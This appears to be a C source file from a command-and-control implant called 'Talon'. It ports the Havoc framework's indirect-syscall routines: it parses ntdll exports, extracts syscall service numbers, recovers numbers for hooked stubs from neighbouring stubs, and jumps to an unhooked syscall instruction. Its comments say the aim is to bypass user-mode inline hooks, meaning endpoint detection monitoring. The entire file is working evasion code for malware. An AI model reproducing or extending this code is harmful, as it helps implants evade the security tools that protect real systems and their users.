#include <Talon.h>

#include <Core.h>
#include <Syscall.h>

/* Indirect syscalls — ported from Demon (Havoc) src/core/Syscalls.c and the
 * GetSyscallSize stub-walk in src/core/Win32.c. Instead of calling kernel32/
 * ntdll through the IAT (visible to user-mode inline hooks), we read the
 * service number out of an ntdll export's own prologue and tail-jump to its
 * `syscall` instruction. */

#define SYS_ASM_RET 0xC3
#define SYS_RANGE   0x1E
#define SYSCALL_ASM 0x050F /* "syscall" (0F 05), little-endian */
#define SSN_OFFSET_1 0x4
#define SSN_OFFSET_2 0x5

#define DREF_U8( p )  ( *( UCHAR * ) ( p ) )
#define DREF_U16( p ) ( *( USHORT * ) ( p ) )

static PVOID g_Ntdll = NULL;

/* Size of one ntdll syscall stub: minimum distance between the first Zw*
 * export found and any other. Stub size varies between Windows releases, so
 * it must be measured, not hardcoded. */
static UINT32 GetSyscallStubSize( VOID )
{
    PIMAGE_DOS_HEADER       Dos  = ( PIMAGE_DOS_HEADER ) g_Ntdll;
    PIMAGE_NT_HEADERS       Nt   = NULL;
    PIMAGE_EXPORT_DIRECTORY Exp  = NULL;
    PDWORD                  Funcs  = NULL;
    PDWORD                  Names  = NULL;
    PWORD                   Ords   = NULL;
    UINT32                  Size   = 0;
    PVOID                   Addr1  = NULL;

    if ( ! Dos || Dos->e_magic != 0x5A4D )
        return 0;

    Nt = ( PIMAGE_NT_HEADERS ) ( ( PUCHAR ) g_Ntdll + Dos->e_lfanew );
    if ( Nt->Signature != 0x00004550 )
        return 0;

    if ( ! Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress )
        return 0;

    /* the export directory's total size lives in the data-directory entry,
     * not in IMAGE_EXPORT_DIRECTORY itself */
    DWORD ExpDirSize = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;

    Exp   = ( PIMAGE_EXPORT_DIRECTORY ) ( ( PUCHAR ) g_Ntdll + Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    Funcs = ( PDWORD ) ( ( PUCHAR ) g_Ntdll + Exp->AddressOfFunctions );
    Names = ( PDWORD ) ( ( PUCHAR ) g_Ntdll + Exp->AddressOfNames );
    Ords  = ( PWORD )  ( ( PUCHAR ) g_Ntdll + Exp->AddressOfNameOrdinals );

    for ( DWORD i = 0; i < Exp->NumberOfNames; i++ ) {
        PCHAR FunctionName = ( PCHAR ) ( ( PUCHAR ) g_Ntdll + Names[ i ] );

        /* only Zw* entries — genuine syscall stubs, not forwarders */
        if ( *( USHORT * ) FunctionName != 0x775A )
            continue;

        DWORD Rva = Funcs[ Ords[ i ] ];

        /* skip forwarder strings pointing into the export directory */
        if ( Rva < Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress ||
             Rva >= Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress + ExpDirSize )
            continue;

        if ( ! Addr1 ) {
            Addr1 = ( PVOID ) ( ( PUCHAR ) g_Ntdll + Rva );
            continue;
        }

        {
            PVOID  Addr2  = ( PVOID ) ( ( PUCHAR ) g_Ntdll + Rva );
            UINT32 Offset = ( ULONG_PTR ) Addr1 > ( ULONG_PTR ) Addr2 ?
                            ( UINT32 ) ( ( ULONG_PTR ) Addr1 - ( ULONG_PTR ) Addr2 ) :
                            ( UINT32 ) ( ( ULONG_PTR ) Addr2 - ( ULONG_PTR ) Addr1 );
            if ( ! Size || Offset < Size )
                Size = Offset;
        }
    }

    return Size;
}

/* Scan a native function's prologue for:
 *     mov r10, rcx      4C 8B D1
 *     mov eax, imm32    B8 <ssn>
 * and capture the SSN plus the address of the following `syscall` (within
 * SYS_RANGE bytes). If the stub is hooked (pattern gone) and ResolveHooked is
 * set, derive the SSN from a neighbouring unhooked stub — valid because ntdll
 * assigns SSNs sequentially. */
BOOL SysExtract( PVOID Function, BOOL ResolveHooked, PWORD Ssn, PVOID* SysAddr )
{
    ULONG Offset = 0;
    BYTE  SsnLow = 0;
    BYTE  SsnHigh = 0;
    BOOL  Success = FALSE;

    if ( ! Function )
        return FALSE;

    if ( ! Ssn && ! SysAddr )
        return FALSE;

    do {
        if ( DREF_U8( Function + Offset ) == SYS_ASM_RET )
            break; /* end of stub without finding the pattern */

        if ( DREF_U8( Function + Offset + 0x0 ) == 0x4C &&
             DREF_U8( Function + Offset + 0x1 ) == 0x8B &&
             DREF_U8( Function + Offset + 0x2 ) == 0xD1 &&
             DREF_U8( Function + Offset + 0x3 ) == 0xB8 ) {

            if ( Ssn ) {
                SsnLow  = DREF_U8( Function + Offset + SSN_OFFSET_1 );
                SsnHigh = DREF_U8( Function + Offset + SSN_OFFSET_2 );
                *Ssn    = ( WORD ) ( ( SsnHigh << 0x08 ) | SsnLow );
                Success = TRUE;
            }

            if ( SysAddr ) {
                for ( int i = 0; i < SYS_RANGE; i++ ) {
                    if ( DREF_U16( Function + Offset + i ) == SYSCALL_ASM ) {
                        *SysAddr = ( PVOID ) ( Function + Offset + i );
                        Success   = TRUE;
                        break;
                    }
                }
            }

            break;
        }

        Offset++;
    } while ( TRUE );

    if ( ! Success && Ssn && ResolveHooked ) {
        /* stub is hooked: borrow the SSN from a neighbouring stub */
        UINT32 StubSize = GetSyscallStubSize();
        if ( StubSize ) {
            for ( UINT32 i = 1; i < 500; i++ ) {
                WORD NeighbourSsn = 0;

                if ( SysExtract( ( PVOID ) ( ( ULONG_PTR ) Function + ( StubSize * i ) ), FALSE, &NeighbourSsn, NULL ) ) {
                    *Ssn = ( WORD ) ( NeighbourSsn - i );
                    return TRUE;
                }

                if ( SysExtract( ( PVOID ) ( ( ULONG_PTR ) Function - ( StubSize * i ) ), FALSE, &NeighbourSsn, NULL ) ) {
                    *Ssn = ( WORD ) ( NeighbourSsn + i );
                    return TRUE;
                }
            }
        }
    }

    return Success;
}

VOID TalonSyscallInit( VOID )
{
    g_Ntdll = GetModuleHandleA( "ntdll" );
    if ( ! g_Ntdll )
        return;

    PBYTE Fn = ( PBYTE ) GetProcAddress( g_Ntdll, "NtDelayExecution" );
    if ( ! Fn )
        return;

    /* fast path: stub is intact — SSN and syscall instruction in one scan */
    if ( SysExtract( Fn, TRUE, &Instance.Syscall.NtDelayExecution.Ssn, &Instance.Syscall.NtDelayExecution.Adr ) ) {
        Instance.Syscall.Ready = TRUE;
        return;
    }

    /* hooked stub: take the SSN from a neighbour (delta-corrected) and reuse
     * that neighbour's `syscall` instruction — it is unhooked by definition. */
    UINT32 StubSize = GetSyscallStubSize();
    if ( ! StubSize )
        return;

    for ( UINT32 i = 1; i < 500; i++ ) {
        WORD  NeighbourSsn = 0;
        PVOID NeighbourSys = NULL;

        if ( SysExtract( ( PVOID ) ( ( ULONG_PTR ) Fn + ( StubSize * i ) ), FALSE, &NeighbourSsn, &NeighbourSys ) ) {
            Instance.Syscall.NtDelayExecution.Ssn = ( WORD ) ( NeighbourSsn - i );
            Instance.Syscall.NtDelayExecution.Adr = NeighbourSys;
            Instance.Syscall.Ready                = TRUE;
            return;
        }

        if ( SysExtract( ( PVOID ) ( ( ULONG_PTR ) Fn - ( StubSize * i ) ), FALSE, &NeighbourSsn, &NeighbourSys ) ) {
            Instance.Syscall.NtDelayExecution.Ssn = ( WORD ) ( NeighbourSsn + i );
            Instance.Syscall.NtDelayExecution.Adr = NeighbourSys;
            Instance.Syscall.Ready                = TRUE;
            return;
        }
    }

    Dbg( "TalonSyscallInit: NtDelayExecution not resolved, falling back to kernel32 sleep\n" );
}
